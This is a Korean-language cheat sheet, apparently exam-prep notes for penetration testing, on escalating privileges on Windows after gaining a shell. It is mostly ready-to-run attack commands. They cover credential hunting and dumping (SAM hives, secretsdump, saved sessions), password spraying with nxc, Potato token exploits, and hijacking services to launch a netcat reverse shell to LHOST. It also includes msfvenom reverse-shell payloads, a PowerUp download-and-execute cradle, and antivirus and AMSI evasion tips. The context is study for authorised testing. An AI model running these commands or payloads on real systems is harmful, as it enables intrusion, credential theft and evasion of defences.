# 04. Windows 셸 뒤

셸 잡으면 여기부터. 명령 풀어썼다. 원본·설명: [[02. 단일 Windows 기법]]
⚠️ `LHOST` 는 타겟 셸에 없다 → [[00. START]]의 IP를 손으로 박는다.

> [!danger] 7월 실패가 정확히 이 파일이다
> winPEAS를 돌렸고 답(평문 비번)이 출력에 있었는데 **출력이 389KB 한 줄이라 못 읽고 3시간을 잃었다.**
> 교훈: winPEAS는 **파일로 저장 → Kali로 회수 → grep** 한다. 화면 스크롤로 읽지 마라. → 3절.

## 1. 초기 열거 — 파일로 저장하고 읽는다

```cmd
whoami /priv & whoami /all & whoami /groups
systeminfo & hostname & ipconfig /all
net users & net localgroup administrators
netstat -ano & tasklist /svc
```
```powershell
Get-LocalUser; Get-LocalGroupMember Administrators
```
읽는 순서:
- `whoami /priv` 에 **Se…Privilege 가 Enabled** → **5. juicy 토큰** (SeImpersonate 보이면 Potato로 즉시 SYSTEM)
- juicy 없으면 → **6. 서비스 오설정 → 7. AlwaysInstallElevated → 8. 크리덴셜**
- `netstat -ano` 로컬 전용 포트 → 피벗 대상
- `whoami /groups` 에 Medium integrity + admin 그룹 → **UAC 우회** 필요

## 3. winPEAS — 파일 저장 → 회수 → grep (7월 실패 지점)

```cmd
C:\Windows\Temp\wp.exe > C:\Windows\Temp\peas.txt 2>&1
```
회수 — 이미 뚫은 경로 재사용(SMB 공유·웹업로드). 예: 익명 쓰기 SMB면
```bash
# Kali
smbclient //TARGET/공유 -N -c 'get peas.txt'
```
### winPEAS grep 배터리 — 인라인 (섹션 제목은 winPEAS 소스 실측)

**A) Kali로 회수했으면 (권장)** — 줄 복원 후 grep. 개행 뭉개짐 대응 포함:
```bash
# 줄 복원 (PowerShell 셸로 받아 한 줄 됐을 때. sed로 섹션·공백을 개행으로)
sed 's/╔══════════╣/\n\n### /g; s/  \+/\n/g' peas.txt > peas.sec
# 배터리 — 실측 적중순 + 자격증명 섹션 확장
for p in \
  '/rp |/ru ' '4104' 'Groups: Administrators' 'Hash:' \
  'AllAccess' 'Everyone \[Allow' 'File Permissions' 'Folder Permissions' \
  'write permissions in PATH|DLL Hijacking' 'non-default folders with write' 'Autorun Applications' \
  'Scheduled Applications' 'Modifiable Services' \
  'Interesting Services' 'AutoLogon|DefaultPassword|AltDefaultPassword' 'AlwaysInstallElevated' 'Unquoted and Space' \
  'Se[A-Za-z]+Privilege: .*(ENABLED|Enabled)' 'Cached GPP Passwords' 'Enumerating saved credentials' \
  'Windows Vault' 'DPAPI (Credential|Master)' 'Cloud Credentials' 'Security Packages Credentials' \
  'ConsoleHost_history' 'PuTTY|WinSCP' 'WSUS' 'SAM & SYSTEM|SAM backup' \
  'unattend|sysprep|Groups.xml|web.config|.kdbx|.ppk|KeePass' 'password|cpassword'; do
  echo "=== $p"; grep -aiE "$p" peas.sec | cut -c1-300
done
```
**B) 회수 못 하면 타겟에서 findstr** (공백=OR, 개행 정상일 때만):
```cmd
findstr /i "/rp /ru 4104 Groups:Administrators Hash: AllAccess Everyone Scheduled Modifiable Interesting AutoLogon AlwaysInstallElevated Unquoted Vault DPAPI Cloud ConsoleHost PuTTY WSUS cpassword" peas.txt
```
**적중하면 → 어디에 쓰나** (이게 없으면 잡고도 또 검색하게 됨):

**적중하면 → 어디에 쓰나** (이게 없으면 잡고도 또 검색하게 됨). 원리는 셋 — ⓐ비번 흘린 곳 ⓑ내가 바꿀 수 있는 SYSTEM 것 ⓒ내 토큰/해시.

| 적중 패턴 | 왜 여기서 나오나 (한 줄) | → 바로 가는 곳 |
|---|---|---|
| `/rp \|/ru` · `4104` | schtasks가 `/rp` 뒤에 비번을 평문으로 받고, 그게 PS로그(4104)에 박혀서 | 그 계정으로 `runas`/`nxc`/evil-winrm. 7월 답이 여기 |
| `Groups: Administrators` | 관리자 그룹 멤버 명단이라 — 그 계정만 잡으면 곧 admin | 스프레이 대상 · 그 계정 잡으면 admin |
| `Hash:` | winPEAS가 인증 과정에서 NetNTLMv2 해시를 낚아채 출력해서 | `hashcat -m 5600` 크랙 → 재사용 / PtH |
| `File Permissions "..."` (F/M/W) | 그 파일이 SYSTEM 서비스 exe면 내 페이로드로 덮어씀 | **6절** 바이너리 교체 |
| `Folder Permissions "..."` | 폴더에 쓰기권 → 그 안 exe/DLL 교체·심기 | **6절** DLL 하이재킹 |
| `AllAccess`·`Everyone [Allow` | "누구나 쓰기 가능" 마커 — 위 파일/폴더가 뭔지 보고 분기 | 서비스 exe면 6절 교체 |
| `write permissions in PATH`·`DLL Hijacking` | PATH 폴더에 쓰기권 → 서비스가 찾는 DLL을 내 걸로 | **6절** PATH DLL 하이재킹 |
| `non-default folders with write` | 표준 밖 폴더의 exe에 쓰기권 → 교체 | **6절** 바이너리 교체 |
| `Autorun Applications` (modifiable) | 부팅시 SYSTEM이 실행하는 바이너리를 내가 수정 | 내용 교체 후 재부팅 대기 |
| `Scheduled` (modify others binaries) | 남 계정으로 도는 태스크의 바이너리에 쓰기권 | 내용 교체 후 트리거 대기 |
| `Interesting Services`·`Modifiable Services` | 서비스 «설정»을 내가 바꿀 수 있으면 실행경로를 내 셸로 | **6절** binpath 변경 |
| `Unquoted and Space` | 따옴표 없는 경로라 Windows가 `C:\Program.exe`를 먼저 실행 | **6절** `C:\Program.exe` 심기 |
| `AlwaysInstallElevated` (set to 1) | 이 정책=1이면 누가 설치하든 MSI가 SYSTEM으로 실행돼서 | **7절** 악성 `.msi` → `msiexec` |
| `Se…Privilege: ENABLED` | 내 «현재» 토큰에 붙은 특권이라 비번 없이 바로 승격 | **5절** SeImpersonate→Potato / SeBackup→SAM |
| `AutoLogon`·`DefaultPassword` | 자동로그인 설정하면 비번이 레지스트리에 평문 저장돼서 | 그 계정 재사용 |
| `Cached GPP Passwords` | 도메인이 SYSVOL에 뿌린 cpassword, MS가 AES키를 공개해서 | `gpp-decrypt` → 도메인 계정 (AD면 [[07. AD]]) |
| `Windows Vault`·`DPAPI`·`Security Packages` | OS가 저장한 비번 금고라 admin이면 복호 가능 | (admin이후) mimikatz/SharpDPAPI |
| `ConsoleHost_history` | 사용자가 콘솔에 친 명령이 그대로 남아 비번이 섞여서 | 그 파일 `type` 해서 비번 확보 |
| `PuTTY`·`WinSCP` | 저장 세션의 비번이 레지스트리에 평문/약암호로 | 레지스트리 추출 → SSH/재사용 |
| `Cloud Credentials` | AWS/Azure/gcloud 접속 토큰이 파일로 남아서 | 클라우드 축이면 활용 |
| `WSUS` | HTTP(암호화X) 업데이트면 가짜 업데이트를 끼워넣어서 | (고급) 가짜 업데이트로 SYSTEM |
| `SAM & SYSTEM` | 비번 DB 하이브 백업이 있으면 전체 로컬해시가 나와서 | `secretsdump -sam -system LOCAL` |
| `unattend\|kdbx\|KeePass\|.ppk` | 무인설치·비번금고·SSH키 파일에 자격증명이 들어서 | 파일 열기 · KeePass는 `keepass2john` |

> [!warning] 적중 0 = 「그 벡터 없음」이라는 **답**이다 (패턴 고장 아님). 0건도 기록.
> 적중 ≠ 취약 — `AlwaysInstallElevated` 매치돼도 본문이 `isn't available`일 수 있다. **본문을 읽어라.**
> `Se…Privilege` 0건이 곧 「juicy 토큰 없음 → 서비스·크리덴셜로 전환」 신호다.

⚠️ PowerShell 리버스셸로 받은 출력은 **개행이 한 줄로 뭉개진다**(7월 실패의 실물). findstr는 그럼 무력 → 위 A)로 회수해 `sed` 복원 후 grep. 원인·상세 [[07. PEAS 출력 트리아지]].

또는 PowerUp:
```powershell
iex(new-object net.webclient).downloadstring('http://LHOST/PowerUp.ps1'); Invoke-AllChecks
```

## 4. 자격증명 사냥
```cmd
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   :: autologon 평문
dir /s /b C:\*unattend.xml C:\*sysprep.xml C:\*.kdbx 2>nul
findstr /si password *.xml *.ini *.config *.txt C:\ 2>nul
type C:\xampp\passwords.txt 2>nul
```
```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```
**찾은 자격증명은 «전 서비스·전 호스트»에 스윕** (Kali에서, 어디에 쓸지 즉답):
```bash
# 한 계정을 여러 프로토콜에 — Pwn3d! 뜨는 곳이 다음 셸
nxc smb   TARGET -u USER -p PASS          # (Pwn3d!)=로컬admin → psexec/wmiexec
nxc winrm TARGET -u USER -p PASS          # (Pwn3d!)=evil-winrm 가능
nxc rdp   TARGET -u USER -p PASS
nxc mssql TARGET -u USER -p PASS --local-auth
# 로컬 계정이면 --local-auth, 도메인이면 빼고. 해시면 -H NThash (PtH)
nxc smb SUBNET -u USER -p PASS --continue-on-success   # 대역 전체 → 재사용 되는 호스트 찾기
```
```bash
# Pwn3d! 뜬 곳에 impacket으로 대화형 셸 (psexec→wmiexec→smbexec 순서로 시도)
impacket-psexec  TARGET/USER:PASS@TARGET     # SYSTEM 셸
impacket-wmiexec TARGET/USER:PASS@TARGET     # 더 은밀
impacket-secretsdump TARGET/USER:PASS@TARGET # SAM/LSA 원격 덤프 → 다른 해시 확보
# 해시만 있으면 전부 -hashes :NThash (PtH). 로컬계정은 Administrator@TARGET
```
**Potato 선택** (SeImpersonate/SeAssignPrimaryToken → SYSTEM). OS·조건 따라 골라라:
| 도구 | 조건 | 비고 |
|---|---|---|
| **PrintSpoofer** | Win10/2016/2019, Spooler 실행 | 대화형(`-i -c cmd`), 첫 시도 |
| **GodPotato** | 2012~2022·Win8~11 광범위 | `.NET4` 버전, 제일 범용 |
| **JuicyPotatoNG** | 위 둘 실패 시 (DCOM) | 특정 CLSID 필요할 수 있음 |
| **SigmaPotato** | 최신(GodPotato 파생) | AMSI 잘 피함 |
```cmd
C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd
C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
:: SeBackup/SeRestore → SAM/SYSTEM 하이브 덤프
reg save hklm\sam C:\Windows\Temp\sam.hive & reg save hklm\system C:\Windows\Temp\system.hive
::   → Kali: impacket-secretsdump -sam sam.hive -system system.hive LOCAL
:: SeManageVolume → SeManageVolumeExploit.exe   / SeTakeOwnership → takeown+icacls utilman.exe 교체
:: SeDebug → mimikatz로 lsass 토큰 훔치기  /  SeLoadDriver → 취약 드라이버 로드(고급)
```
**SeImpersonate 없고 서비스도 안 되면** — 커널·앱 익스:
```cmd
:: PrintNightmare (CVE-2021-1675/34527, Spooler) — 로컬/원격 SYSTEM
:: → nxc smb $T -M spooler 로 Spooler 확인 후 PoC
:: HiveNightmare(SeriousSAM CVE-2021-36934): shadow copy에서 SAM 읽기
vssadmin list shadows
:: named pipe impersonation (서비스가 파이프 열 때) — Potato류가 이걸 이용
```

## 6. 서비스 오설정 / 쓰기가능 파일 (juicy 없을 때)
```cmd
:: (a) 약한 서비스 «설정» 변경권 — binpath를 내 셸로
accesschk.exe -uwcqv user * /accepteula          :: SERVICE_CHANGE_CONFIG 찾기
sc config <service> binpath= "C:\Windows\Temp\nc64.exe LHOST 443 -e cmd.exe" obj= LocalSystem
sc stop <service> & sc start <service>
```
```cmd
:: (b) 약한 서비스 «바이너리» 권한 — exe를 페이로드로 덮기
icacls "C:\path\svc.exe"                          :: (F)/(M)/(W) 있으면
sc qc <service>                                   :: BINARY_PATH_NAME 확인
copy /y C:\Windows\Temp\rev.exe "C:\path\svc.exe" & sc stop <svc> & sc start <svc>
```
```cmd
:: (c) Unquoted service path — C:\Program.exe 심기
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
:: 쓰기가능 상위폴더에 msfvenom -f exe -o Program.exe 두고: sc start <service>
```
```cmd
:: (d) PATH DLL Hijacking — winPEAS "write permissions in PATH" 떴을 때
echo %PATH%                                        :: 쓰기가능 폴더 확인 (icacls로)
:: 서비스가 찾는 DLL 이름으로: msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. -f dll -o C:\쓰기가능PATH\hijack.dll
:: Procmon "NAME NOT FOUND" 로 어떤 DLL 찾는지 확인 후 그 이름으로
```
```cmd
:: (e) Autorun/Scheduled 바이너리 쓰기가능 — 내용 교체 후 재부팅/트리거 대기
icacls "C:\경로\autorun.exe"                       :: (F)/(M)/(W) 확인
copy /y C:\Windows\Temp\rev.exe "C:\경로\autorun.exe"
```

## 9. 리버스셸 페이로드 · AV 우회 · 폴백 (Kali)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rev.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o e.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o e.msi
# staged는 nc로 안 받아짐 → shell_reverse_tcp(stageless) + nc, 또는 nc64.exe -e
```
**Defender/AV가 잡을 때** (msfvenom exe는 거의 다 잡힘):
```powershell
# 1) 파일 안 떨구는 순수 PowerShell 리버스셸 (revshells.com "PowerShell #3 base64")
powershell -e <BASE64_PAYLOAD>
# 2) nc.exe도 잡히면 → PS 원라이너 (AMSI 우회 필요시 앞에 붙임)
# 3) 컴파일형 우회: nishang Invoke-PowerShellTcp, 또는 C# 로더, 또는 -f exe --encoder 여러겹
# 4) LOLBAS: certutil/mshta/regsvr32/rundll32 로 다운로드·실행
```
**리버스셸이 안 붙으면** (아웃바운드 방화벽):
```
포트를 443 → 80 → 53 순으로 (LPORT 바꿔 재생성). 그래도 안 되면 바인드셸:
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$LPORT -f exe -o b.exe  → nc $T $LPORT
```
**HTTP 전송이 막히면** — 콘솔에 직접 붙여넣기(최후수단):
```powershell
# Kali: base64 rev.exe -w0  → 출력을 타겟 콘솔에 붙여:
[IO.File]::WriteAllBytes("C:\Windows\Temp\r.exe",[Convert]::FromBase64String("<BASE64>"))
```
